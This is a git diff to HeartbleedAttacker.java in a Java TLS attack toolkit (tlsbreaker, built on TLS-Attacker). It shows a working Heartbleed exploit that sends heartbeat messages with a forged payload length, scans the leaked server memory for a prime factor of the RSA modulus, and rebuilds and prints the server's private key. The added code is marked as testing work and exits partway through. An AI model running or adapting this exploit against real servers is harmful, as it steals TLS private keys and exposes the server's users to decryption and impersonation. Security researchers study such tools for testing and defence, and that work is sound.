@@ -6,7 +6,6 @@
  * Licensed under Apache License, Version 2.0
  * http://www.apache.org/licenses/LICENSE-2.0.txt
  */
-
 package de.rub.nds.tlsbreaker.heartbleed.impl;
 
 import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
@@ -34,6 +33,9 @@ import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
 import de.rub.nds.tlsattacker.core.workflow.action.*;
+import de.rub.nds.tlsattacker.core.workflow.action.executor.MessageActionResult;
+import de.rub.nds.tlsattacker.core.workflow.action.executor.ReceiveMessageHelper;
+import de.rub.nds.tlsattacker.core.workflow.action.executor.SendMessageHelper;
 import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
 import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
 import de.rub.nds.tlsattacker.transport.ConnectionEndType;
@@ -50,6 +52,7 @@ import java.io.IOException;
 import java.math.BigInteger;
 import java.security.interfaces.RSAPublicKey;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.LinkedList;
 import java.util.List;
 
@@ -152,7 +155,7 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
                 count++;
                 // privateKey = findPrivateKey(heartbeatMessage.getPayload().getOriginalValue(), publicKey, count);
                 rsaPrivateKey =
-                        findPrivateKey(message.getCompleteResultingMessage().getOriginalValue(), publicKey, count);
+                    findPrivateKey(message.getCompleteResultingMessage().getOriginalValue(), publicKey, count, null);
                 if (rsaPrivateKey != null) {
                     break;
                 }
@@ -204,19 +207,105 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
 
     private List<ProtocolMessage> getHeartbeatMessages() {
         Config tlsConfig = getTlsConfig();
+        tlsConfig.setWorkflowExecutorShouldClose(false);
+        tlsConfig.setStopActionsAfterIOException(false);
+        tlsConfig.setStopActionsAfterFatal(false);
+        tlsConfig.setStopReceivingAfterFatal(false);
+
         WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
-                                                                                              RunningModeType.CLIENT);
+            RunningModeType.CLIENT);
         State state = setTraceAndGetState(trace, tlsConfig);
         // LOGGER.info("Trace Action count:" + trace.getTlsActions().size());
         try {
             WorkflowExecutor workflowExecutor =
-                    WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
+                WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
             workflowExecutor.executeWorkflow();
         } catch (WorkflowExecutionException ex) {
             LOGGER.info(
-                    "The TLS protocol flow was not executed completely, follow the debug messages for more information.");
+                "The TLS protocol flow was not executed completely, follow the debug messages for more information.");
             LOGGER.debug(ex);
         }
+        // TODO: Start of testing new code
+        RSAPublicKey publicKey = getServerPublicKey();
+        if (publicKey == null) {
+            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
+            return null;
+        }
+        RSAPrivateKey rsaPrivateKey = null;
+        ReceiveMessageHelper receiveMessageHelper = new ReceiveMessageHelper();
+        SendMessageHelper sendMessageHelper = new SendMessageHelper();
+        List<ProtocolMessage> messages = new LinkedList<>();
+
+        for (int i = 0; i < config.getHeartbeatCount(); i++) {
+            try {
+                HeartbeatMessage message = new HeartbeatMessage(tlsConfig);
+                ModifiableByte heartbeatMessageType = new ModifiableByte();
+                ModifiableInteger payloadLength = new ModifiableInteger();
+                payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
+                ModifiableByteArray payload = new ModifiableByteArray();
+                payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
+                message.setHeartbeatMessageType(heartbeatMessageType);
+                message.setPayload(payload);
+                message.setPayloadLength(payloadLength);
+                sendMessageHelper.sendMessages(new ArrayList<>(Arrays.asList(message)), null, null,
+                    state.getOutboundTlsContexts().get(0));
+
+                // TlsContext tlsContext = state.getTlsContext(state.getTlsContext().getConnection().getAlias());
+                MessageActionResult result = receiveMessageHelper.receiveMessages(
+                    new ArrayList<>(Arrays.asList(new HeartbeatMessage())), state.getOutboundTlsContexts().get(0));
+                for (ProtocolMessage heartbeatRespnse : result.getMessageList()) {
+                    rsaPrivateKey = findPrivateKey(heartbeatRespnse.getCompleteResultingMessage().getOriginalValue(),
+                        publicKey, 0, state);
+                    if (rsaPrivateKey != null) {
+                        break;
+                    }
+                }
+
+                if (rsaPrivateKey != null) {
+                    displayPrivateKey(rsaPrivateKey);
+                    break;
+                }
+
+                // To keep connection active
+                /*
+                 * byte[] protocolMessageBytes = SendMessageHelper.prepareMessage(new HttpsRequestMessage(tlsConfig),
+                 * state.getTlsContext()); List<AbstractRecord> recordList = new LinkedList<>(); Record r = new
+                 * Record(); r.setContentMessageType(ProtocolMessageType.APPLICATION_DATA); recordList.add(r); byte[]
+                 * prepareRecords = state.getTlsContext().getRecordLayer().prepareRecords(protocolMessageBytes,
+                 * ProtocolMessageType.APPLICATION_DATA, recordList);
+                 * state.getTlsContext().getTransportHandler().sendData(prepareRecords); //MessageActionResult
+                 * httpRequest = sendMessageHelper.sendMessages(new ArrayList<>(Arrays.asList(new
+                 * ApplicationMessage(tlsConfig))), null, null, state.getOutboundTlsContexts().get(0));
+                 * //LOGGER.info("httpRequest = " + httpRequest.getMessageList()); MessageActionResult httpResponse =
+                 * receiveMessageHelper.receiveMessages(state.getOutboundTlsContexts().get(0));
+                 * LOGGER.info("httpResponse = " + httpResponse.getMessageList());
+                 */
+
+                /*
+                 * MessageAction requestAction = MessageActionFactory.createAction(tlsConfig,
+                 * tlsConfig.getDefaultClientConnection(), ConnectionEndType.CLIENT, new
+                 * HttpsRequestMessage(tlsConfig)); requestAction.execute(state); MessageAction responseAction =
+                 * MessageActionFactory.createAction(tlsConfig, tlsConfig.getDefaultClientConnection(),
+                 * ConnectionEndType.SERVER, new HttpsResponseMessage(tlsConfig)); responseAction.execute(state);
+                 * messages.addAll(result.getMessageList());
+                 */
+            } catch (Exception e) {
+                e.printStackTrace();
+                System.exit(0);
+            }
+
+        }
+        // state.getInboundTlsContexts().get(0).getTransportHandler().closeConnection();
+        try {
+            state.getOutboundTlsContexts().get(0).getTransportHandler().closeConnection();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
+        // messages = new ArrayList<>(result.getMessageList());
+        System.exit(0);
+        // TODO: End of testing new code
+
         // WorkflowTraceUtil.getAllReceivedRecords(trace, ProtocolMessageType.HEARTBEAT);
         List<ProtocolMessage> receivedMessage = new LinkedList<>();
         for (ProtocolMessage message : getAllReceivedMessages(trace)) {
@@ -227,7 +316,9 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
         }
 
         // return getAllReceivedMessages(trace , ProtocolMessageType.HEARTBEAT );
-        return receivedMessage;
+        // TODO: working return statement -> return receivedMessage;
+        // return receivedMessage;
+        return messages;
     }
 
     private void searchPrivateKeyInDumpFile() {
@@ -240,7 +331,7 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
 
         RSAPrivateKey rsaPrivateKey = null;
         for (byte[] data : fileContents) {
-            rsaPrivateKey = findPrivateKey(data, publicKey, 0);
+            rsaPrivateKey = findPrivateKey(data, publicKey, 0, null);
             if (rsaPrivateKey != null) {
                 break;
             }
@@ -268,7 +359,7 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
         // LOGGER.info(System.lineSeparator() + encodedPrivateKey);
     }
 
-    private RSAPrivateKey findPrivateKey(byte[] rawServerData, RSAPublicKey publicKey, int count) {
+    private RSAPrivateKey findPrivateKey(byte[] rawServerData, RSAPublicKey publicKey, int count, State state) {
         String str = null;
         // byte[] rawServerData = heartbeatMessage.getPayload().getOriginalValue();
         BigInteger n = publicKey.getModulus();
@@ -282,6 +373,17 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
             // LOGGER.info("heartbeat(" + count + ") chunk(" + i + ") lastElement = " + chunk[chunk.length - 1]);
             LOGGER.info("Processing  memory chunk = " + bytesToRawHexString(chunk));
 
+            if ((i + 1) % 6000 == 0) {
+                MessageAction requestAction =
+                    MessageActionFactory.createAction(tlsConfig, tlsConfig.getDefaultClientConnection(),
+                        ConnectionEndType.CLIENT, new HttpsRequestMessage(tlsConfig));
+                requestAction.execute(state);
+                MessageAction responseAction =
+                    MessageActionFactory.createAction(tlsConfig, tlsConfig.getDefaultClientConnection(),
+                        ConnectionEndType.SERVER, new HttpsResponseMessage(tlsConfig));
+                responseAction.execute(state);
+            }
+
             // TODO: Remove Testing
             /*
              * String hexChunk = bytesToRawHexString(chunk); String reverseHexChunk =
@@ -292,13 +394,13 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
              * BigInteger(primeString)); }
              */// TODO: ending of testing code
 
-            BigInteger first = new BigInteger(1, new byte[]{chunk[0]});
+            BigInteger first = new BigInteger(1, new byte[] { chunk[0] });
             if (ZERO.equals(first.mod(BigInteger.valueOf(2)))) {
                 LOGGER.debug("Skipping even number = " + chunk[0]);
                 continue;
             }
 
-            BigInteger last = new BigInteger(1, new byte[]{chunk[chunk.length - 1]});
+            BigInteger last = new BigInteger(1, new byte[] { chunk[chunk.length - 1] });
             if (ZERO.equals(last)) {
                 LOGGER.debug("Skipping number ending with zero =" + last);
                 continue;
@@ -324,6 +426,7 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
                 // break;
             }
         }
+
         return null;
     }
 
@@ -345,7 +448,7 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
          * InvalidKeySpecException exception) { exception.printStackTrace(); }
          */
         RSAPrivateKey rsaPrivateKey =
-                new RSAPrivateKey(n, e, d, p, q, d.mod(pMinusOne), d.mod(qMinusOne), q.modInverse(p));
+            new RSAPrivateKey(n, e, d, p, q, d.mod(pMinusOne), d.mod(qMinusOne), q.modInverse(p));
         // rsaPrivateKey.getEncoded();
         /*
          * StringWriter sWrt = new StringWriter(); JcaPEMWriter pemWriter = new JcaPEMWriter(sWrt); try {
@@ -366,7 +469,7 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
     public Boolean isVulnerable() {
         Config tlsConfig = getTlsConfig();
         WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig)
-                .createWorkflowTrace(WorkflowTraceType.DYNAMIC_HELLO, RunningModeType.CLIENT);
+            .createWorkflowTrace(WorkflowTraceType.DYNAMIC_HELLO, RunningModeType.CLIENT);
         trace.addTlsAction(new SendDynamicClientKeyExchangeAction());
         trace.addTlsAction(new SendAction(new ChangeCipherSpecMessage(), new FinishedMessage()));
         trace.addTlsAction(new ReceiveAction(new ChangeCipherSpecMessage(), new FinishedMessage()));
@@ -378,30 +481,30 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
         ModifiableInteger payloadLength = new ModifiableInteger();
         payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
         ModifiableByteArray payload = new ModifiableByteArray();
-        payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[]{1, 3}));
+        payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
         message.setHeartbeatMessageType(heartbeatMessageType);
         message.setPayload(payload);
         message.setPayloadLength(payloadLength);
 
         try {
             WorkflowExecutor workflowExecutor =
-                    WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
+                WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
             workflowExecutor.executeWorkflow();
         } catch (WorkflowExecutionException ex) {
             LOGGER.info(
-                    "The TLS protocol flow was not executed completely, follow the debug messages for more information.");
+                "The TLS protocol flow was not executed completely, follow the debug messages for more information.");
             LOGGER.debug(ex);
         }
 
         if (WorkflowTraceUtil.didReceiveMessage(HEARTBEAT, trace)) {
             LOGGER.info(
-                    "Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid Length value");
+                "Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid Length value");
             return true;
         } else if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.FINISHED, trace)) {
             return null;
         } else {
             LOGGER.info(
-                    "(Most probably) Not vulnerable. The server does not respond with a heartbeat message, it is not vulnerable");
+                "(Most probably) Not vulnerable. The server does not respond with a heartbeat message, it is not vulnerable");
             return false;
         }
     }
@@ -411,15 +514,15 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
         State state = null;
         // trace.addTlsAction(new ReceiveTillAction(new ServerHelloDoneMessage()));
         trace.addTlsAction(new SendAction(new ECDHClientKeyExchangeMessage(tlsConfig),
-                                          new ChangeCipherSpecMessage(tlsConfig), new FinishedMessage(tlsConfig)));
+            new ChangeCipherSpecMessage(tlsConfig), new FinishedMessage(tlsConfig)));
         trace.addTlsAction(new GenericReceiveAction());
         /*
          * trace.addTlsAction(new SendDynamicClientKeyExchangeAction()); trace.addTlsAction(new SendAction(new
          * ChangeCipherSpecMessage(), new FinishedMessage())); trace.addTlsAction(new ReceiveAction(new
          * ChangeCipherSpecMessage(), new FinishedMessage()));
          */
-
-        for (int i = 1; i <= config.getHeartbeatCount(); i++) {
+        // TODO: Start of working code. commented for testing
+        /*for (int i = 1; i <= config.getHeartbeatCount(); i++) {
             HeartbeatMessage message = new HeartbeatMessage(tlsConfig);
             trace.addTlsAction(new SendAction(message));
             trace.addTlsAction(new ReceiveAction(new HeartbeatMessage()));
@@ -436,14 +539,13 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
 
             if (i % 10 == 0) {
                 // HTTP request
-                MessageAction action = MessageActionFactory.createAction(tlsConfig, connection,
-                                                                         ConnectionEndType.CLIENT, new HttpsRequestMessage(tlsConfig));
+                MessageAction action = MessageActionFactory.createAction(tlsConfig, connection, ConnectionEndType.CLIENT, new HttpsRequestMessage(tlsConfig));
                 trace.addTlsAction(action);
-                action = MessageActionFactory.createAction(tlsConfig, connection, ConnectionEndType.SERVER,
-                                                           new HttpsResponseMessage(tlsConfig));
+                action = MessageActionFactory.createAction(tlsConfig, connection, ConnectionEndType.SERVER, new HttpsResponseMessage(tlsConfig));
                 trace.addTlsAction(action);
             }
-        }
+        }*/
+        // TODO: End of working code. commented for testing
 
         state = new State(tlsConfig, trace);// State state = new State(tlsConfig, trace);
 
